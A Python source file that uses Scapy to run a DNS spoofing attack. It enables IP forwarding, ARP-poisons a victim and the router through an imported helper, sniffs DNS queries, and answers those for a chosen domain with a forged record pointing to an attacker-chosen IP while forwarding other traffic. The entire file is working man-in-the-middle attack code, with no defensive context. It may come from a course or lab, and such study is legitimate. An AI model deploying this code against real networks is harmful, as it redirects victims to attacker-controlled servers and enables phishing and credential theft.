from scapy.all import *
from arp import * 
from helper import *

def set_ip_forwarding(ip_forwarding):
    """
    Sets the ip forwarding setting, enable or disable it
    """
    if ip_forwarding:
        print("Enabling IP forwarding")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    else:
        print("Disabling IP forwarding")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def send_dns_spoof_packet(packet, domain, spoofed_ip):
    spoofed_packet = (
        IP(dst=packet[IP].src, src=packet[IP].dst) /
        UDP(dport=packet[UDP].sport, sport=53) /
        DNS(
            id=packet[DNS].id,
            qr=1,
            aa=1,
            rd=1,
            ra=1,
            qd=packet[DNS].qd,
            an=DNSRR(rrname=domain, type='A', rdata=spoofed_ip, ttl=300)
        )
    )
    send(spoofed_packet, verbose=False)
    print("Send spoofed DNS response for %s to %s with IP %s" % (domain, packet[IP].src, spoofed_ip))

def handle_packet(packet, domain, spoofed_ip, victim_ip, router_ip):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        query_domain = packet.getlayer(DNS).qd.qname.decode('utf-8').rstrip('.')
        print("DNS query received from %s for %s" % (packet[IP].src, query_domain))

        if query_domain == domain:
            print("Spoofing %s to %s" % (domain, spoofed_ip))
            send_dns_spoof_packet(packet, domain, spoofed_ip)
        else:
            packet[IP].dst = "1.1.1.1"
            del packet[Ether].dst
            packet[IP].src = victim_ip
            packet.show()
            print("non spoofed DNS query for %s. forwarding to %s" % (query_domain, packet[IP].dst))
            send(packet, verbose=False)
    elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
        print("Received DNS response from %s to %s" % (packet[IP].src, packet[IP].src))
    else:
        if packet.haslayer(IP):
            print("Received non dns packet, forwarfing") 
            if packet[IP].src == victim_ip:
                send(packet, verbose=False)
            elif packet[IP].src == router_ip:
                send(packet, verbose=False)
                
def spoof(interface, domain, victim_ip, spoofed_ip):
    print("Starting a DNS spoof for victim %s, pretending %s is at %s" % (victim_ip, domain, spoofed_ip))
    try:
        set_ip_forwarding(True)
        router_ip = conf.route.route("0.0.0.0")[2]
        print("Router ip: %s" % router_ip)
        arp1 = arp()
        arp1.two_way_arp_spoof(victim_ip, router_ip, 2, interface)
        sniff(filter="udp and port 53", prn=lambda pkt: handle_packet(pkt, domain, spoofed_ip, victim_ip, router_ip), store=0, iface=interface)
    except KeyboardInterrupt:
        print("stopping DNS spoof")
    except Exception as e:
        print("An error occurred: %s" % e)
    finally:
        arp1.stop_two_way_spoof()
        set_ip_forwarding(False)
        print("DNS spoofing stopped")
        
        
        
        
